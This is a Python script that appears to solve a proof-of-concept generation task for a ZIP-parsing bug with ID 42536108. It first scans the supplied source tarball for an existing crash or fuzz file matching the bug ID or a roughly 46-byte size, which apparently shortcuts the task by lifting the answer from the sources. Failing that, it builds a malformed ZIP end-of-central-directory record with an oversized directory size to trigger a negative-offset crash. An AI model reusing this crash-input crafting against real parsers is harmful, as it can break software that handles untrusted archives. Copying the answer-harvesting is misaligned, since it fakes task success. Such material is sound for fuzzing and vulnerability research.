import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_poc_by_bug_id(src_path)
        if data is not None:
            return data

        data = self._find_best_candidate_file(src_path)
        if data is not None:
            return data

        if self._detect_zip_project(src_path):
            return self._craft_zip_negative_offset_poc()

        return self._craft_zip_negative_offset_poc()

    def _find_poc_by_bug_id(self, src_path: str) -> bytes | None:
        bug_ids = ["42536108", "4253610", "425361", "42536"]
        skip_source_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp",
            ".java", ".kt", ".kts", ".py", ".py3", ".sh", ".bash",
            ".bat", ".ps1", ".pl", ".pm", ".rb", ".go", ".rs",
            ".swift", ".cs", ".js", ".ts", ".php", ".m", ".mm",
            ".scala", ".lua", ".m4", ".ac", ".am", ".cmake",
            ".s", ".S", ".asm",
        }
        candidates = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name_lower = m.name.lower()
                    if not any(b in name_lower for b in bug_ids):
                        continue
                    base = os.path.basename(name_lower)
                    ext = os.path.splitext(base)[1]
                    if ext in skip_source_exts:
                        continue
                    try:
                        f = tf.extractfile(m)
                    except Exception:
                        continue
                    if f is None:
                        continue
                    try:
                        d = f.read()
                    except Exception:
                        continue
                    if not d:
                        continue
                    L = len(d)
                    closeness = -abs(L - 46)
                    ascii_count = sum(1 for b in d if 32 <= b <= 126 or b in (9, 10, 13))
                    ascii_ratio = ascii_count / float(L)
                    binary_bonus = 1 if ascii_ratio < 0.95 else 0
                    magic_bonus = 0
                    if d.startswith(b"PK\x03\x04") or d.startswith(b"PK\x05\x06") or d.startswith(b"PK\x07\x08"):
                        magic_bonus += 5
                    if d.startswith(b"7z\xbc\xaf'\x1c"):
                        magic_bonus += 5
                    if d.startswith(b"Rar!\x1a\x07\x00") or d.startswith(b"Rar!\x1a\x07\x01\x00"):
                        magic_bonus += 5
                    if d.startswith(b"\x1f\x8b"):
                        magic_bonus += 3
                    if d.startswith(b"BZh"):
                        magic_bonus += 3
                    if d.startswith(b"\xfd7zXZ"):
                        magic_bonus += 4
                    score = magic_bonus * 3 + binary_bonus * 2
                    candidates.append((score, closeness, -L, name_lower, d))
        except tarfile.ReadError:
            return None
        if candidates:
            candidates.sort(reverse=True)
            return candidates[0][-1]
        return None

    def _find_best_candidate_file(self, src_path: str) -> bytes | None:
        code_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp",
            ".java", ".kt", ".kts", ".py", ".py3", ".sh", ".bash",
            ".bat", ".ps1", ".pl", ".pm", ".rb", ".go", ".rs",
            ".swift", ".cs", ".js", ".ts", ".php", ".m", ".mm",
            ".scala", ".lua", ".m4", ".ac", ".am", ".cmake",
            ".s", ".S", ".asm",
        }
        archive_exts = {
            ".zip", ".7z", ".rar", ".tar", ".tgz", ".gz", ".bz2",
            ".xz", ".lzma", ".ar", ".cpio", ".iso", ".cab", ".jar",
            ".apk", ".war", ".ear", ".lz", ".zst", ".lz4",
        }
        name_keywords = [
            "poc", "crash", "bug", "issue", "oss", "fuzz",
            "seed", "corpus", "input", "sample", "test",
            "regress", "case",
        ]

        best_sig = None
        best_gen = None

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    size = m.size
                    if size <= 0:
                        continue
                    if size > 100000:
                        continue
                    name = m.name
                    path_lower = name.lower()
                    base = os.path.basename(path_lower)
                    ext = os.path.splitext(base)[1]
                    if ext in code_exts:
                        continue
                    try:
                        f = tf.extractfile(m)
                    except Exception:
                        continue
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue
                    L = len(data)
                    ascii_count = sum(1 for b in data if 32 <= b <= 126 or b in (9, 10, 13))
                    ascii_ratio = ascii_count / float(L)

                    closeness = max(0, 10 - abs(L - 46))

                    kw_score = 0
                    for kw in name_keywords:
                        if kw in path_lower:
                            kw_score += 1

                    binary_score = 0
                    if ascii_ratio < 0.9:
                        binary_score += 1
                    if ascii_ratio < 0.5:
                        binary_score += 1

                    ext_score = 0
                    if ext in archive_exts:
                        ext_score += 3

                    magic_score = 0
                    if data.startswith(b"PK\x03\x04") or data.startswith(b"PK\x05\x06") or data.startswith(b"PK\x07\x08"):
                        magic_score += 8
                    if data.startswith(b"7z\xbc\xaf'\x1c"):
                        magic_score += 8
                    if data.startswith(b"Rar!\x1a\x07\x00") or data.startswith(b"Rar!\x1a\x07\x01\x00"):
                        magic_score += 8
                    if data.startswith(b"\x1f\x8b"):
                        magic_score += 5
                    if data.startswith(b"BZh"):
                        magic_score += 5
                    if data.startswith(b"\xfd7zXZ"):
                        magic_score += 7
                    if L > 262 and (data[257:262] == b"ustar" or data[257:262] == b"ustar\x00"):
                        magic_score += 5

                    score = closeness + 2 * kw_score + 2 * ext_score + binary_score + magic_score
                    cand = (score, -abs(L - 46), -L, path_lower, data)

                    if magic_score > 0:
                        if best_sig is None or cand > best_sig:
                            best_sig = cand
                    else:
                        if best_gen is None or cand > best_gen:
                            best_gen = cand
        except tarfile.ReadError:
            return None

        if best_sig is not None and best_sig[0] > 0:
            return best_sig[-1]
        if best_gen is not None and best_gen[0] > 0:
            return best_gen[-1]
        if best_sig is not None:
            return best_sig[-1]
        if best_gen is not None:
            return best_gen[-1]
        return None

    def _detect_zip_project(self, src_path: str) -> bool:
        indicators = [
            "PK\\x03\\x04",
            "PK\\x05\\x06",
            "0x04034b50",
            "0x06054b50",
            "end of central directory",
            "End of central directory",
            "EOCD",
        ]
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    ext = os.path.splitext(m.name)[1].lower()
                    if ext not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".m", ".mm"):
                        continue
                    if m.size > 200000:
                        continue
                    try:
                        f = tf.extractfile(m)
                    except Exception:
                        continue
                    if f is None:
                        continue
                    try:
                        txt = f.read(65536).decode("latin1", errors="ignore")
                    except Exception:
                        continue
                    lower = txt.lower()
                    if "zip" in lower and any(ind in txt for ind in indicators):
                        return True
                    if any(ind in txt for ind in indicators):
                        return True
        except tarfile.ReadError:
            return False
        return False

    def _craft_zip_negative_offset_poc(self) -> bytes:
        comment_len = 24
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # EOCD signature
            0,           # disk number
            0,           # central dir disk
            1,           # entries on this disk
            1,           # total entries
            0xFFFFFFF0,  # very large central directory size
            0,           # central directory offset
            comment_len  # ZIP file comment length
        )
        comment = b"A" * comment_len
        return eocd + comment